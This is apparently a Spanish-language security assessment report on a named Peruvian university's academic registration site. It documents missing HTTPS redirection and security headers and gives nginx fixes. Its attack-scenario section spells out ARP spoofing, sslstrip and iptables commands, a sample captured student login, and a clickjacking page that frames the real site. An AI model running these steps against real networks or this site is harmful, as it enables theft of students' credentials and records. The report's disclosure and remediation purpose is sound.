# VULN-003 — SIIGAA sin Forzado de HTTPS: Transmisión de Credenciales en Texto Plano
## `registro.uns.edu.pe` — Universidad Nacional del Santa

---

| Campo | Detalle |
|-------|---------|
| **ID** | VULN-003 |
| **Severidad** | 🔴 Alta |
| **CVSS v3.1 Score** | **7.5** |
| **Vector CVSS** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` |
| **OWASP Top 10 - 2021** | A02 – Cryptographic Failures |
| **WSTG ID** | WSTG-CRYP-03, WSTG-CONF-06 |
| **CWE** | CWE-319 (Cleartext Transmission of Sensitive Information), CWE-523 (Unprotected Transport of Credentials) |
| **URL Afectada** | `http://registro.uns.edu.pe` (HTTP sin cifrar) |
| **Fecha de descubrimiento** | 2026-09-20 |

---

## 1. Descripción

El **Sistema Integrado de Información y Gestión Académica (SIIGAA)** de la UNS en `registro.uns.edu.pe` presenta las siguientes fallas criptográficas:

1. **No existe redirección HTTP → HTTPS**: Un usuario que accede a `http://registro.uns.edu.pe` no es redirigido automáticamente a la versión segura HTTPS. Sus credenciales viajan en texto plano.

2. **Sin HSTS (HTTP Strict-Transport-Security)**: Aunque HTTPS está disponible, el servidor no envía el header HSTS, lo que permite ataques de **SSL Stripping** donde un atacante elimina el HTTPS y degrada la conexión a HTTP.

3. **Sin X-Frame-Options**: La página puede ser embebida en un iframe en cualquier sitio externo, habilitando ataques de **Clickjacking**.

4. **Sin Content-Security-Policy**: No hay política de seguridad de contenido, facilitando ataques XSS.

```
Cabeceras de respuesta reales de registro.uns.edu.pe:
  HTTP/1.1 200 OK
  [Sin Strict-Transport-Security]
  [Sin Content-Security-Policy]
  [Sin X-Frame-Options]
  [Sin X-Content-Type-Options]
  [Sin Referrer-Policy]
  [Sin Permissions-Policy]
  Puntuación: 33/100 | Grado: F
```

---

## 2. Evidencia Real

```bash
# Prueba 1: HTTP no redirige a HTTPS
curl -I http://registro.uns.edu.pe/udemsi/faces/modulos.xhtml
→ HTTP/1.1 200 OK       ← SIN redirección 301/302 a HTTPS
→ [Contenido servido en HTTP sin cifrar]

# Prueba 2: Ausencia de HSTS en la respuesta HTTPS
curl -I https://registro.uns.edu.pe/
→ HTTP/1.1 200 OK
→ [Sin cabecera: Strict-Transport-Security]
```

---

## 3. Escenario de Ataque — Man-in-the-Middle (MitM)

> Este ataque es realista en cualquier red Wi-Fi universitaria compartida.

### Contexto
Un estudiante se conecta a la red Wi-Fi de la cafetería o biblioteca de la UNS y accede al SIIGAA escribiendo `registro.uns.edu.pe` en su navegador (sin escribir `https://`).

### Herramientas del atacante
- `mitmproxy` o `Bettercap` (en la misma red Wi-Fi)
- `sslstrip` (para el ataque de SSL Stripping)

### Paso 1: El atacante se posiciona como intermediario en la red Wi-Fi
```bash
# El atacante está en la misma red Wi-Fi universitaria
# Habilita IP forwarding para redirigir tráfico
echo 1 > /proc/sys/net/ipv4/ip_forward

# Envenena la caché ARP (ARP spoofing) para interceptar tráfico
arpspoof -i wlan0 -t [IP_VICTIMA] [IP_GATEWAY]
```

### Paso 2: SSL Stripping — Eliminar HTTPS
```bash
# Como el servidor NO tiene HSTS, el atacante puede degradar HTTPS a HTTP
# sslstrip intercepta la conexión y elimina el cifrado
sslstrip -l 8080

# Configura iptables para redirigir el tráfico HTTP por sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

### Paso 3: Interceptación de credenciales
```
El estudiante escribe en su navegador:
  registro.uns.edu.pe

Con el ataque activo, el navegador usa HTTP (no HTTPS).
El form de login envía:

POST http://registro.uns.edu.pe/udemsi/j_security_check HTTP/1.1
Host: registro.uns.edu.pe
Content-Type: application/x-www-form-urlencoded

j_username=20180012&j_password=Estudio123    ← VISIBLE EN TEXTO PLANO

El atacante ve en su pantalla:
[mitmproxy] Credencial capturada:
  Usuario: 20180012
  Contraseña: Estudio123
```

### Paso 4: Uso de las credenciales robadas
```
El atacante inicia sesión en el SIIGAA con las credenciales del estudiante:
  - Ve sus calificaciones, historial académico, datos personales
  - Puede consultar su expediente completo
  - Si el sistema no protege contra IDOR, puede acceder a datos de otros estudiantes
```

### Ataque Alternativo: Clickjacking
```html
<!-- El atacante crea una página maliciosa con el SIIGAA embebido -->
<!-- Como NO hay X-Frame-Options, el SIIGAA puede embeberse en iframes -->

<html>
<body>
  <h1>¡Gana una beca universitaria! Haz clic aquí:</h1>
  
  <!-- El SIIGAA real, invisible, debajo del botón -->
  <iframe src="https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml"
          style="opacity:0; position:absolute; top:0; left:0;
                 width:100%; height:100%; z-index:999;">
  </iframe>
  
  <!-- El estudiante cree que hace clic en "Ganar beca"
       pero en realidad está haciendo clic en elementos del SIIGAA -->
  <button style="position:relative; z-index:1">Participar</button>
</body>
</html>
```

---

## 4. Remediación

### Corrección Inmediata — Forzar HTTPS en Nginx/OpenResty

```nginx
# ============================================================
# PASO 1: Bloque HTTP → Redirigir TODO a HTTPS
# ============================================================
server {
    listen 80;
    server_name registro.uns.edu.pe;

    # Redirección permanente a HTTPS
    return 301 https://$host$request_uri;
}

# ============================================================
# PASO 2: Bloque HTTPS — Agregar todas las cabeceras de seguridad
# ============================================================
server {
    listen 443 ssl http2;
    server_name registro.uns.edu.pe;

    ssl_certificate     /etc/ssl/certs/registro.uns.edu.pe.crt;
    ssl_certificate_key /etc/ssl/private/registro.uns.edu.pe.key;

    # ── HSTS: Forzar HTTPS en el navegador por 1 año ──
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # ── Prevenir Clickjacking ──
    add_header X-Frame-Options "DENY" always;

    # ── Prevenir MIME sniffing ──
    add_header X-Content-Type-Options "nosniff" always;

    # ── Política de Contenido (ajustar según necesidades del SIIGAA) ──
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;

    # ── Control de información de Referrer ──
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    location / {
        proxy_pass http://app_siigaa_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
    }
}
```

### Corrección HSTS Preload (nivel avanzado)
```
1. Configurar HSTS con max-age ≥ 31536000 (1 año)
2. Incluir "includeSubDomains" y "preload" en el header
3. Registrar el dominio en https://hstspreload.org/
   → El navegador bloqueará HTTP desde la primera visita, sin necesidad del header
```

### Verificación del Parche
```bash
# Verificar redirección HTTP → HTTPS:
curl -I http://registro.uns.edu.pe/
→ HTTP/1.1 301 Moved Permanently
→ Location: https://registro.uns.edu.pe/   ✅

# Verificar presencia de HSTS:
curl -I https://registro.uns.edu.pe/
→ Strict-Transport-Security: max-age=31536000; includeSubDomains   ✅

# Verificar X-Frame-Options:
→ X-Frame-Options: DENY   ✅
```

---

## 5. Referencias

- [OWASP — A02:2021 Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [WSTG-CRYP-03: Testing for Sensitive Information Sent via Unencrypted Channels](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels)
- [OWASP HSTS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)
- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- [sslstrip — Moxie Marlinspike](https://moxie.org/software/sslstrip/)
